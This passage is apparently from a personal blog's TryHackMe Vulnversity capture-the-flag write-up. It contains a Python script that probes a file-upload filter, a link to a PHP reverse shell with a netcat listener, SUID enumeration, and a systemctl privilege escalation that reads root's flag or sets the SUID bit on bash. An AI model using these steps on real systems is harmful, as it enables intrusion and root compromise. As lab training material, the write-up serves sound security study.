</pre></table></code></div></div><p>Testing allowed file extension using python</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre>
<span class="c1">#! /usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="kn">import</span> <span class="nn">os</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.207.82"</span>

<span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:3333/internal/index.php"</span>

<span class="c1"># print (url)
</span>
<span class="n">old_filename</span> <span class="o">=</span> <span class="s">"revshell.php"</span>

<span class="n">filename</span> <span class="o">=</span> <span class="s">"revshell"</span>

<span class="n">extensions</span> <span class="o">=</span> <span class="p">[</span>

<span class="s">".php"</span><span class="p">,</span>

<span class="s">".php3"</span><span class="p">,</span>

<span class="s">".php4"</span><span class="p">,</span>

<span class="s">".php5"</span><span class="p">,</span>

<span class="s">".phtml"</span>

<span class="p">]</span>

<span class="k">for</span> <span class="n">ext</span> <span class="ow">in</span> <span class="n">extensions</span><span class="p">:</span>

<span class="n">new_filename</span> <span class="o">=</span> <span class="n">filename</span> <span class="o">+</span> <span class="n">ext</span>

<span class="n">os</span><span class="p">.</span><span class="n">rename</span><span class="p">(</span><span class="n">old_filename</span><span class="p">,</span> <span class="n">new_filename</span><span class="p">)</span>

<span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s">"file"</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="n">new_filename</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)}</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span> <span class="o">=</span> <span class="n">files</span><span class="p">)</span>

<span class="c1"># print(r)
</span>
<span class="k">if</span> <span class="s">"Extension not allowed"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>

<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">ext</span><span class="si">}</span><span class="s"> not allowed"</span><span class="p">)</span>

<span class="k">else</span><span class="p">:</span>

<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">ext</span><span class="si">}</span><span class="s"> seems to be allowed"</span><span class="p">)</span>

<span class="n">old_filename</span> <span class="o">=</span> <span class="n">new_filename</span>
</pre></table></code></div></div><p>Upload php reverse shell</p><p><a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</a></p><p>Update ip address and port</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>
<span class="c"># nc -lvnp 1234</span>
</pre></table></code></div></div><p>Once getting foot hold inside the machine, we are going to do privilege escalation</p><p>SUID (set owner userId upon execution) allow user to run the program or file with the permission of the owner.</p><p>One way to find the SUID by executing the following command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
</pre><td class="rouge-code"><pre><span class="nv">$ </span>find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-ldb</span> <span class="o">{}</span> <span class="se">\;</span>

<span class="nt">-rwsr-xr-x</span> 1 root root 32944 May 16  2017 /usr/bin/newuidmap

<span class="nt">-rwsr-xr-x</span> 1 root root 49584 May 16  2017 /usr/bin/chfn

<span class="nt">-rwsr-xr-x</span> 1 root root 32944 May 16  2017 /usr/bin/newgidmap

<span class="nt">-rwsr-xr-x</span> 1 root root 136808 Jul  4  2017 /usr/bin/sudo         

<span class="nt">-rwsr-xr-x</span> 1 root root 40432 May 16  2017 /usr/bin/chsh

<span class="nt">-rwsr-xr-x</span> 1 root root 54256 May 16  2017 /usr/bin/passwd

<span class="nt">-rwsr-xr-x</span> 1 root root 23376 Jan 15  2019 /usr/bin/pkexec

<span class="nt">-rwsr-xr-x</span> 1 root root 39904 May 16  2017 /usr/bin/newgrp

<span class="nt">-rwsr-xr-x</span> 1 root root 75304 May 16  2017 /usr/bin/gpasswd

<span class="nt">-rwsr-sr-x</span> 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine

<span class="nt">-rwsr-xr-x</span> 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1

<span class="nt">-rwsr-xr-x</span> 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign

<span class="nt">-rwsr-xr-x</span> 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device

<span class="nt">-rwsr-xr-x</span> 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger                                         

<span class="nt">-rwsr-xr--</span> 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

<span class="nt">-rwsr-xr-x</span> 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

<span class="nt">-rwsr-xr-x</span> 1 root root 40128 May 16  2017 /bin/su

<span class="nt">-rwsr-xr-x</span> 1 root root 142032 Jan 28  2017 /bin/ntfs-3g

<span class="nt">-rwsr-xr-x</span> 1 root root 40152 May 16  2018 /bin/mount

<span class="nt">-rwsr-xr-x</span> 1 root root 44680 May  7  2014 /bin/ping6

<span class="nt">-rwsr-xr-x</span> 1 root root 27608 May 16  2018 /bin/umount

<span class="nt">-rwsr-xr-x</span> 1 root root 659856 Feb 13  2019 /bin/systemctl

<span class="nt">-rwsr-xr-x</span> 1 root root 44168 May  7  2014 /bin/ping

<span class="nt">-rwsr-xr-x</span> 1 root root 30800 Jul 12  2016 /bin/fusermount

<span class="nt">-rwsr-xr-x</span> 1 root root 35600 Mar  6  2017 /sbin/mount.cifs

The following <span class="nb">command </span><span class="k">return </span>similar result

<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null

Or

<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null

/usr/bin/newuidmap

/usr/bin/chfn

/usr/bin/newgidmap

/usr/bin/sudo

/usr/bin/chsh

/usr/bin/passwd

/usr/bin/pkexec

/usr/bin/newgrp

/usr/bin/gpasswd

/usr/bin/at

/usr/lib/snapd/snap-confine

/usr/lib/policykit-1/polkit-agent-helper-1

/usr/lib/openssh/ssh-keysign

/usr/lib/eject/dmcrypt-get-device

/usr/lib/squid/pinger

/usr/lib/dbus-1.0/dbus-daemon-launch-helper

/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

/bin/su

/bin/ntfs-3g

/bin/mount

/bin/ping6

/bin/umount

/bin/systemctl

/bin/ping

/bin/fusermount

/sbin/mount.cifs
</pre></table></code></div></div><h2 id="task-5"><span class="mr-2">TASK 5</span><a href="#task-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>/bin/systemctl

GTOFBin gives the following example

<span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>.service

<span class="nb">echo</span> <span class="s1">'[Service]

Type=oneshot

ExecStart=/bin/sh -c "id &gt; /tmp/output"

[Install]

WantedBy=multi-user.target'</span> <span class="o">&gt;</span> <span class="nv">$TF</span>

./systemctl <span class="nb">link</span> <span class="nv">$TF</span>

./systemctl <span class="nb">enable</span> <span class="nt">--now</span> <span class="nv">$TF</span>
</pre></table></code></div></div><p>We have to modify it to export the content of the file to us.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>.service

<span class="nb">echo</span> <span class="s1">'[Service]

Type=oneshot

ExecStart=/bin/sh -c "cat /root/root.txt &gt; /tmp/output"

[Install]

WantedBy=multi-user.target'</span> <span class="o">&gt;</span> <span class="nv">$TF</span>

/bin/systemctl <span class="nb">link</span> <span class="nv">$TF</span>

/bin/systemctl <span class="nb">enable</span> <span class="nt">--now</span> <span class="nv">$TF</span>

Or we can get root shell access

<span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>.service

<span class="nb">echo</span> <span class="s1">'[Service]

Type=oneshot

ExecStart=/bin/sh -c "chmod +s /bin/bash"

[Install]

WantedBy=multi-user.target'</span> <span class="o">&gt;</span> <span class="nv">$TF</span>

/bin/systemctl <span class="nb">link</span> <span class="nv">$TF</span>

/bin/systemctl <span class="nb">enable</span> <span class="nt">--now</span> <span class="nv">$TF</span>

/bin/bash <span class="nt">-p</span>
</pre></table></code></div></div><p>chmod +s gives permission to other user execution rights</p><p>/bin/bash -p</p><p>$ The End</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/it/'>IT</a>, <a href='/categories/cybersec/'>CyberSec</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/write-up/" class="post-tag no-text-decoration" >write-up</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TryHackMe Vulnvercity write-up - Ivan Zhao&amp;url=https://zhhivan.github.io/posts/THM-Vulnvercity-Writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TryHackMe Vulnvercity write-up - Ivan Zhao&amp;u=https://zhhivan.github.io/posts/THM-Vulnvercity-Writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://zhhivan.github.io/posts/THM-Vulnvercity-Writeup/&amp;text=TryHackMe Vulnvercity write-up - Ivan Zhao" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/THM-Blue-Writeup/">TryHackMe Blue write-up</a><li><a href="/posts/THM-Vulnvercity-Writeup/">TryHackMe Vulnvercity write-up</a><li><a href="/posts/cc-pen-testing-writeup-tryhackme/">TryHackMe CC - Pen Testing write-up</a><li><a href="/posts/my-first-post/">My first post</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/write-up/">write-up</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/my-first-post/"><div class="card-body"> <em class="timeago small" data-ts="1648907010" > 2022-04-03 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>My first post</h3><div class="text-muted small"><p> This is my first post</p></div></div></a></div><div class="card"> <a href="/posts/cc-pen-testing-writeup-tryhackme/"><div class="card-body"> <em class="timeago small" data-ts="1649241810" > 2022-04-06 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe CC - Pen Testing write-up</h3><div class="text-muted small"><p> task 1 task 2 Pretty easy, so I am only listing notable questions $ sudo nmap -p80 -sVC 10.10.65.59 task 3 All answers can be found in netcat man page $ man nc task 4 Mostly just reading gobuste...</p></div></div></a></div><div class="card"> <a href="/posts/THM-Blue-Writeup/"><div class="card-body"> <em class="timeago small" data-ts="1676974470" > 2023-02-21 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe Blue write-up</h3><div class="text-muted small"><p> 1, setup create ip variable so we don’t need to enter it again $ export ip=10.10.39.230 $ echo $ip 2, recon &amp;amp; enumeration TASK 1 use nmap for recon. $ nmap -sV -sC -p-1000 --script vuln $...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/THM-Blue-Writeup/" class="btn btn-outline-primary" prompt="Older"><p>TryHackMe Blue write-up</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Ivan Zhao</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/write-up/">write-up</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
